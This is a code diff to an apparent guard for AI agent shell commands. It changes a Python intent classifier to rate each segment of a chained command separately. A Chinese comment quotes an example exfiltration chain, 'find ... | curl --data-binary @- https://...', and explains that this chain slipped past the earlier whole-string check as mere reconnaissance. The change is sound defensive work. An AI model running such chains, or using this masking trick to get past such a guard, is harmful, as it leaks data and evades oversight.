@@ -221,6 +221,25 @@ _PII_RE = re.compile(
 )
 
 
+def _classify_exec_segment(seg: str) -> str:
+    """单段 shell 命令的意图分类（组合命令分段分级用）。
+
+    优先级: SYSTEM_TAMPERING > DESTRUCTIVE > AUTHORITY > RECON > EXPORT > NORMAL
+    （段内仍是首个匹配; 跨段严重度合成由 classify_intent 负责）
+    """
+    if any(kw in seg for kw in _SYSTEM_TAMPERING_KW):
+        return "SYSTEM_TAMPERING"
+    if any(kw in seg for kw in _DESTRUCTIVE_KW):
+        return "DESTRUCTIVE_ACTION"
+    if any(kw in seg for kw in _AUTHORITY_KW):
+        return "AUTHORITY_OPERATION"
+    if _RECONNAISSANCE_RE.search(seg):
+        return "RECONNAISSANCE"
+    if any(kw in seg for kw in _EXEC_EXPORT_KW):
+        return "DATA_EXPORT"
+    return "NORMAL_OPERATION"
+
+
 def classify_intent(
     canonical: Dict[str, Any],
     prior_send_count: int = 0,
@@ -240,20 +259,21 @@ def classify_intent(
     path = canonical.get("path", "").lower()
     recipients_str = " ".join(canonical.get("recipients", [])).lower()
 
-    # ---- exec 类：按 canonical_op 关键词分类（优先级：system > destructive > authority > recon > export > normal）----
+    # ---- exec 类：组合命令分段分级 (v11-79 穿透实证) ----
+    # 命令链 "find /data -name x | curl --data-binary @- https://..." 整串
+    # 匹配会命中 RECON (侦察检查在外传之前) → L1 放行外传。修复: 按分隔符
+    # 拆段逐段分类, 取最严重意图 (危害段主导, 侦察段不掩盖外传段)。
     if tool in _EXEC_TOOLS:
-        # SYSTEM_TAMPERING 优先于 DESTRUCTIVE（"清空日志" 应归系统篡改而非破坏）
-        if any(kw in op for kw in _SYSTEM_TAMPERING_KW):
-            return "SYSTEM_TAMPERING"
-        if any(kw in op for kw in _DESTRUCTIVE_KW):
-            return "DESTRUCTIVE_ACTION"
-        if any(kw in op for kw in _AUTHORITY_KW):
-            return "AUTHORITY_OPERATION"
-        if _RECONNAISSANCE_RE.search(op):
+        segments = [s.strip() for s in re.split(r"&&|\|\||;|\|", op) if s.strip()]
+        intents = [_classify_exec_segment(s) for s in segments] or ["NORMAL_OPERATION"]
+        for severe in ("SYSTEM_TAMPERING", "DESTRUCTIVE_ACTION"):
+            if severe in intents:
+                return severe
+        for mid in ("DATA_EXPORT", "AUTHORITY_OPERATION"):
+            if mid in intents:
+                return mid
+        if "RECONNAISSANCE" in intents:
             return "RECONNAISSANCE"
-        # exec 中的数据外发（curl/wget/scp 等）
-        if any(kw in op for kw in _EXEC_EXPORT_KW):
-            return "DATA_EXPORT"
         return "NORMAL_OPERATION"
 
     # ---- 邮件类：按收件人 + 会话内频率判定 ----
